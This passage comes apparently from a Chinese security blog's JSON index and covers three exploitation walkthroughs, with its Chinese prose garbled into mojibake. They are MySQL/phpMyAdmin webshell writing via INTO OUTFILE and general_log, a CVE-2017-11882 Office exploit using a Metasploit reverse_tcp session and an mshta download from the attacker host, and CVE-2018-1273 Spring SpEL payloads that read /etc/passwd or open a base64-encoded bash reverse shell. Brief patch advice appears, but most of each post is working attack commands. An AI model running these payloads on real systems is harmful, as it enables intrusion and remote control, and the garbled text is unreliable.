magic_quotes_gpcï¼šå¼€å¯æ—¶ï¼Œä¼šå¯¹â€™å•å¼•å·è¿›è¡Œè½¬ä¹‰ï¼Œä½¿å…¶å˜æˆâ€œ\\â€åæ–œæ ã€‚ secure_file_privï¼šæ­¤é…ç½®é¡¹ç”¨æ¥å®Œæˆå¯¹æ•°æ®å¯¼å…¥å¯¼å‡ºçš„é™åˆ¶ï¼Œå¦‚å…è®¸å¯¼å…¥å¯¼å‡ºåˆ°æŒ‡å®šç›®å½•ã€‚ file_privï¼šfile_privæƒé™å…è®¸ä½ ç”¨load_fileã€into outfileè¯»å’Œå†™æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ï¼Œä»»ä½•è¢«æˆäºˆè¿™ä¸ªæƒé™çš„ç”¨æˆ·éƒ½èƒ½è¯»å’Œå†™æœåŠ¡å™¨çš„ä»»ä½•æ–‡ä»¶ã€‚ 0x01 into outfile 0x001å‰ææ¡ä»¶ï¼š 1.Rootæ•°æ®åº“ç”¨æˆ·ï¼ˆrootæƒé™ï¼‰ 2.ç½‘ç«™ç»å¯¹è·¯å¾„ï¼ˆç¡®å®šæœ‰å†™å…¥æƒé™ï¼‰ 12345æš´ç»å¯¹è·¯å¾„phpMyAdmin/libraries/select_lang.lib.phpphpMyAdmin/darkblue_orange/layout.inc.phpphpMyAdmin/index.php?lang[]=1phpmyadmin/themes/darkblue_orange/layout.inc.php 3.æŸ¥çœ‹èƒ½å¦è‡ªå®šä¹‰å¯¼å…¥å¯¼å‡ºæ•°æ®åˆ°ä»»æ„ç›®å½•çš„æƒé™ 12345678æŸ¥çœ‹èƒ½å¦è‡ªå®šä¹‰å¯¼å‡ºæ–‡ä»¶ç›®å½•çš„æƒé™ show global variables like &quot;%secure%&quot;; //æŸ¥è¯¢secure_file_privé…ç½® secure_file_prive=null //ä¸å…è®¸å¯¼å…¥å¯¼å‡ºæ•°æ®åˆ°ç›®å½• secure_file_priv=c:\\sec //å…è®¸å¯¼å…¥å¯¼å‡ºæ•°æ®åˆ°æŒ‡å®šç›®å½• secure_file_priv=&apos;&apos; //å…è®¸å¯¼å…¥å¯¼å‡ºæ•°æ®åˆ°ä»»æ„ç›®å½• secure_file_priv=&quot;/&quot; //å…è®¸å¯¼å…¥å¯¼å‡ºæ•°æ®åˆ°ä»»æ„ç›®å½• æ³¨ï¼šåœ¨my.iniã€my.cnfã€mysqld.cnfæ–‡ä»¶ä¸­æ‰¾åˆ°secure_file_priveå¹¶å°†å…¶å€¼è®¾ç½®ä¸º&quot;&quot;æˆ–&quot;/&quot;ï¼Œé‡å¯MySQLæœåŠ¡ï¼ 0x002 å¯¼å…¥ä¸€å¥è¯shell 123select &apos;&lt;?php @eval($_POST[pass]);?&gt;&apos; into outfile &apos;c:/xampp/htdocs/1.php&apos;; select &apos;&lt;?php @eval($_POST[pass]);?&gt;&apos; into outfile &apos;c:\\\\xampp\\\\htdocs\\\\2.php&apos;;select &apos;&lt;?php @eval($_POST[pass]);?&gt;&apos; into dumpfile &apos;c:\\\\xampp\\\\htdocs\\\\3.php&apos;; 0x003 æµ‹è¯•å†™å…¥phpinfoæ–‡ä»¶ select â€˜â€˜ into dumpfile â€˜c:\\xampp\\htdocs\\phpinfo.phpâ€™; 0x02 åˆ©ç”¨æ—¥å¿—getshell 0x001 å‰ææ¡ä»¶ï¼š è¦æ±‚mysqlçš„ç‰ˆæœ¬ä¸º5.0ä»¥ä¸Šï¼Œå› ä¸º5.0ä»¥ä¸Šä¼šåˆ›å»ºæ—¥å¿—æ–‡ä»¶ è¦æ±‚å¯¹æ—¥å¿—æœ‰å¯è¯»å¯å†™çš„æƒé™ 0x002 åŸç† phpmyadminæœ‰ä¸€ä¸ªè®°å½•æ—¥å¿—çš„æ–‡ä»¶ï¼Œä½†æ˜¯ä¸€èˆ¬æƒ…å†µä¸‹ä¼šå…³é—­ï¼Œå¼€å¯æ—¥å¿—è®°å½•ï¼Œç„¶åè®¾ç½®æ—¥å¿—è®°å½•åç§°ä¸º.phpï¼Œéšä¾¿æ‰§è¡Œsqlè¯­å¥ï¼Œåªè¦åŒ…æ‹¬ä¸€å¥è¯æœ¨é©¬å°±ä¼šè¢«å†™å…¥åˆ°æ—¥å¿—ä¸­å»ï¼Œç„¶åå°±å¯ä»¥è¿æ¥getshell 0x003 æ—¥å¿—å¤‡ä»½è·å–shell show global variables like â€œ%genera%â€;//æŸ¥è¯¢general_logé…ç½® å½“å‰çš„çŠ¶æ€æ˜¯offï¼Œéœ€è¦æ‰‹åŠ¨å¼€å¯æ—¥å¿—ï¼Œè¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼š set global general_log=â€™onâ€™; ç„¶åå†æ¬¡æŸ¥è¯¢general_logé…ç½®å·²å˜æˆONï¼Œè®¾ç½®Webshellæ—¥å¿—æ–‡ä»¶ä¿å­˜è·¯å¾„ï¼ŒMysqlä¼šåˆ¤æ–­æ—¥å¿—æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™ä¼šè‡ªåŠ¨åˆ›å»ºã€‚è¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼š SET global general_log_file=â€™c:/xampp/htdocs/rizhi.phpâ€™; æŸ¥çœ‹æ—¥å¿—æ–‡ä»¶ä¿å­˜è·¯å¾„ï¼Œå¯¹åº”çš„å°±ä¼šç”Ÿæˆrizhi.phpæ–‡ä»¶ ä¸€å¥è¯å†™å…¥æ—¥å¿—æ–‡ä»¶ å…³é—­ general_logæ¨¡å¼ set global general_log=â€™offâ€™; ä½¿ç”¨èšå‰‘è¿æ¥","categories":[{"name":"WEBå®‰å…¨","slug":"WEBå®‰å…¨","permalink":"http://www.vkxss.top/categories/WEBå®‰å…¨/"}],"tags":[{"name":"WEBæ¸—é€æµ‹è¯•","slug":"WEBæ¸—é€æµ‹è¯•","permalink":"http://www.vkxss.top/tags/WEBæ¸—é€æµ‹è¯•/"}]},{"title":"Officeè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´(CVE-2017-11882)","slug":"CVE-2017-11882","date":"2018-05-08T07:30:08.000Z","updated":"2019-10-09T06:03:11.171Z","comments":true,"path":"2018/05/08/CVE-2017-11882/","link":"","permalink":"http://www.vkxss.top/2018/05/08/CVE-2017-11882/","excerpt":"","text":"æ¼æ´æ¦‚è¿° å½±å“èŒƒå›´ å¤ç°ç¯å¢ƒ æ¼æ´å¤ç° ä¿®å¤ æ¼æ´æ¦‚è¿°æ­¤æ¼æ´æ˜¯ç”±Officeè½¯ä»¶é‡Œé¢çš„ [å…¬å¼ç¼–è¾‘å™¨] é€ æˆçš„ï¼Œç”±äºç¼–è¾‘å™¨è¿›ç¨‹æ²¡æœ‰å¯¹åç§°é•¿åº¦è¿›è¡Œæ ¡éªŒï¼Œå¯¼è‡´ç¼“å†²åŒºæº¢å‡ºï¼Œæ”»å‡»è€…é€šè¿‡æ„é€ ç‰¹æ®Šçš„å­—ç¬¦ï¼Œå¯ä»¥å®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚ å½±å“èŒƒå›´12345office 2003 office 2007 office 2010 office 2013 office 2016 å¤ç°ç¯å¢ƒ123æ¸—é€æœºï¼šKali Linux + POCä»£ç  é¶æœºï¼šWin10 + Office 2016å·¥å…·å·²æ‰“åŒ…ï¼šhttps://github.com/vkbiu/CVE/tree/master/CVE-2017-11882 æ¼æ´å¤ç° ç”Ÿæˆwordæ–‡æ¡£test.docï¼Œæ‰“å¼€docæ–‡ä»¶ä¹‹åï¼Œä¼šå¼¹å‡ºè®¡ç®—å™¨ï¼ˆä»¥æ­¤éªŒè¯offceæ¼æ´ï¼‰ 1python Command43b_CVE-2017-11882.py -c &quot;cmd.exe /c calc.exe&quot; -o test.doc win10 office2016è§¦å‘æˆåŠŸ(win10ä¼šæŠ¥æ¯’) åœ¨Kali Linuxä¸Šæ„é€ å¸¦æœ‰shellåé—¨çš„wordæ–‡ä»¶ï¼Œå¹¶å¼€å¯ç›‘å¬ã€‚ æŠŠcve_2017_11882.rbå¤åˆ¶åˆ°/usr/share/Metasploit-framework/modules/exploits/windows/smb å†Copycve-2017-11882.rtfå¤åˆ¶åˆ°/usr/share/metasploit-framework/data/exploits å¯åŠ¨metasploit 123456789101112131415161718192021222324252627282930313233343536373839Metasploit running on Kali Linux as root, using system databaseA database appears to be already configured, skipping initialization .:okOOOkdc&apos; &apos;cdkOOOko:. .xOOOOOOOOOOOOc cOOOOOOOOOOOOx. :OOOOOOOOOOOOOOOk, ,kOOOOOOOOOOOOOOO: &apos;OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO&apos; oOOOOOOOO.MMMM.oOOOOoOOOOl.MMMM,OOOOOOOOo dOOOOOOOO.MMMMMM.cOOOOOc.MMMMMM,OOOOOOOOx lOOOOOOOO.MMMMMMMMM;d;MMMMMMMMM,OOOOOOOOl .OOOOOOOO.MMM.;MMMMMMMMMMM;MMMM,OOOOOOOO. cOOOOOOO.MMM.OOc.MMMMM&apos;oOO.MMM,OOOOOOOc oOOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOOo lOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOl ;OOOO&apos;MMM.OOOO.MMM:OOOO.MMM;OOOO; .dOOo&apos;WM.OOOOocccxOOOO.MX&apos;xOOd. ,kOl&apos;M.OOOOOOOOOOOOO.M&apos;dOk, :kk;.OOOOOOOOOOOOO.;Ok: ;kOOOOOOOOOOOOOOOk: ,xOOOOOOOOOOOx, .lOOOOOOOl. ,dOd, . =[ metasploit v5.0.53-dev- ]+ -- --=[ 1931 exploits - 1079 auxiliary - 332 post ]+ -- --=[ 556 payloads - 45 encoders - 10 nops ]+ -- --=[ 7 evasion ]msf5 &gt; search 11882Matching Modules================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/windows/fileformat/office_ms17_11882 2017-11-15 manual No Microsoft Office CVE-2017-11882 1 exploit/windows/smb/cve_2017_11882 2017-11-21 excellent No Microsoft Office Word Equation Editor RCE ä½¿ç”¨CVE-2017-11882.rbæ¨¡å—ï¼Œå¼€å¯Meterpreterç›‘å¬ä¼šè¯ï¼š 1234567891011121314151617msf5 &gt; use exploit/windows/smb/cve_2017_11882 #ä½¿ç”¨æ¨¡å—msf5 exploit(windows/smb/cve_2017_11882) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcp #è®¾ç½®tcpåå¼¹ä¼šè¯msf5 exploit(windows/smb/cve_2017_11882) &gt; set lhost 192.168.36.131lhost =&gt; 192.168.36.131 #è®¾ç½®æ”»å‡»æœºipåœ°å€msf5 exploit(windows/smb/cve_2017_11882) &gt; set uripath 11882 #è®¾ç½®è·¯å¾„ä¸º11882ï¼Œå¯è‡ªå®šä¹‰uripath =&gt; 11882msf5 exploit(windows/smb/cve_2017_11882) &gt; exploit[*] Exploit running as background job 2.[*] Exploit completed, but no session was created.[*] Started reverse TCP handler on 192.168.36.131:4444 msf5 exploit(windows/smb/cve_2017_11882) &gt; [*] Generating command with length 44[+] msf.rtf stored at /root/.msf4/local/msf.rtf[*] Using URL: http://0.0.0.0:8080/11882[*] Local IP: http://192.168.36.131:8080/11882[*] Server started. åˆ©ç”¨mshtaï¼Œç”Ÿæˆç›®æ ‡æœºçš„æ¼æ´æ–‡æ¡£ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š 12root@kali:~# python Command43b_CVE-2017-11882.py -c &quot;mshta http://192.168.36.131:8080/11882&quot; -o 11882.doc[*] Done ! output file --&gt; 11882.doc å°†ç”Ÿæˆçš„æ–‡ä»¶æ‹·è´åˆ°win10é¶æœºä¸­è¿è¡Œï¼Œå³åœ¨kaliä¸­å¯ä»¥çœ‹åˆ° æˆåŠŸåï¼Œä½¿ç”¨å‘½ä»¤sessions æŸ¥çœ‹ä½ æ§åˆ¶çš„pc ä¿®å¤ åœ¨çº¿æ›´æ–°ï¼Œå¼€å¯Windows Updateæ›´æ–°ã€‚ æ‰“è¡¥ä¸ï¼Œæ­¤æ¼æ´å¯¹åº”çš„å¾®è½¯è¡¥ä¸åœ°å€ï¼šhttps://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11882","categories":[{"name":"CVE-2017","slug":"CVE-2017","permalink":"http://www.vkxss.top/categories/CVE-2017/"}],"tags":[{"name":"CVE-2017-11882","slug":"CVE-2017-11882","permalink":"http://www.vkxss.top/tags/CVE-2017-11882/"}]},{"title":"CVE-2018-1273-RCE","slug":"CVE-2018-1273","date":"2018-04-13T07:30:08.000Z","updated":"2019-10-10T07:14:19.570Z","comments":true,"path":"2018/04/13/CVE-2018-1273/","link":"","permalink":"http://www.vkxss.top/2018/04/13/CVE-2018-1273/","excerpt":"","text":"æ¼æ´æ¦‚è¿° å½±å“èŒƒå›´ å¤ç°ç¯å¢ƒ æ¼æ´å¤ç° ä¿®å¤å»ºè®® Reference æ¼æ´æ¦‚è¿° Spring Data Commonsç»„ä»¶ä¸­å­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2018-1273ï¼‰ï¼Œæ”»å‡»è€…å¯æ„é€ åŒ…å«æœ‰æ¶æ„ä»£ç çš„SPELè¡¨è¾¾å¼å®ç°è¿œç¨‹ä»£ç æ”»å‡»ï¼Œç›´æ¥è·å–æœåŠ¡å™¨æ§åˆ¶æƒé™ã€‚ å½±å“èŒƒå›´ å—å½±å“çš„ç‰ˆæœ¬ Spring Data Commons 1.13 - 1.13.10 (Ingalls SR10) Spring Data REST 2.6 - 2.6.10(Ingalls SR10) Spring Data Commons 2.0 - 2.0.5 (Kay SR5) Spring Data REST 3.0 - 3.0.5(Kay SR5) å®˜æ–¹å·²ç»ä¸æ”¯æŒçš„æ—§ç‰ˆæœ¬ ä¸å—å½±å“çš„ç‰ˆæœ¬ Spring Data Commons â‰¥ 2.0.6 Spring Data Commons â‰¥ 1.13.11 Spring Data REST 2.6.11 (Ingalls SR11) Spring Data REST 3.0.6 (Kay SR6) Spring Boot 1.5.11 Spring Boot 2.0.1 å¤ç°ç¯å¢ƒ dockerç¯å¢ƒæ­å»ºï¼š https://github.com/knqyf263/CVE-2018-1273 æ¼æ´POCï¼š https://github.com/vkbiu/CVE/tree/master/cve-2018-1273 æ¼æ´å¤ç° æ¼æ´åˆ©ç”¨POCï¼š 1username[#this.getClass().forName(&apos;java.lang.Runtime&apos;).getRuntime().exec(&apos;cp /etc/passwd /tmp&apos;)]=123 è¿›å…¥dockerå®¹å™¨æŸ¥çœ‹/tmp/ç›®å½•ä¸‹æˆåŠŸcp /etc/passwdæ–‡ä»¶ åå¼¹shell payloadï¼š 1username[#this.getClass().forName(&apos;java.lang.Runtime&apos;).getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5OS4xOTIvNTU3NyAwPiYxCg==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)]=123 ä¿®å¤å»ºè®® å®˜æ–¹å·²ç»åœ¨æœ€æ–°ç‰ˆæœ¬ä¸­ä¿®å¤äº†è¯¥æ¼æ´ï¼Œè¯·å—å½±å“çš„ç”¨æˆ·å°½å¿«å‡çº§ï¼Œä»¥ä¿è¯é•¿æœŸæœ‰æ•ˆçš„é˜²æŠ¤ã€‚ä¸‹è½½é“¾æ¥è¯·å‚è€ƒä¸‹è¡¨ï¼š ç»„ä»¶ç‰ˆæœ¬ ä¸‹è½½é“¾æ¥ Spring Data Commons 2.0.6 https://github.com/spring-projects/spring-data-commons/archive/2.0.6.RELEASE.zip Spring Data Commons 1.13.11 https://github.com/spring-projects/spring-data-commons/archive/1.13.11.RELEASE.zip Spring Data REST 3.0.6 https://github.com/spring-projects/spring-data-rest/archive/3.0.6.RELEASE.zip Spring Data REST 2.6.11 https://github.com/spring-projects/spring-data-rest/archive/2.6.11.RELEASE.zip Spring Boot 2.0.1 https://github.com/spring-projects/spring-boot/archive/v2.0.1.RELEASE.zip Spring Boot 1.5.11 https://github.com/spring-projects/spring-boot/archive/v1.5.11.RELEASE.zip Reference http://xxlegend.com/2018/04/12/CVE-2018-1273-%20RCE%20with%20Spring%20Data%20Commons%20%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/","categories":[{"name":"CVE-2018","slug":"CVE-2018","permalink":"http://www.vkxss.top/categories/CVE-2018/"}],"tags":[{"name":"CVE-2018-1273","slug":"CVE-2018-1273","permalink":"http://www.vkxss.top/tags/CVE-2018-1273/"}]}]}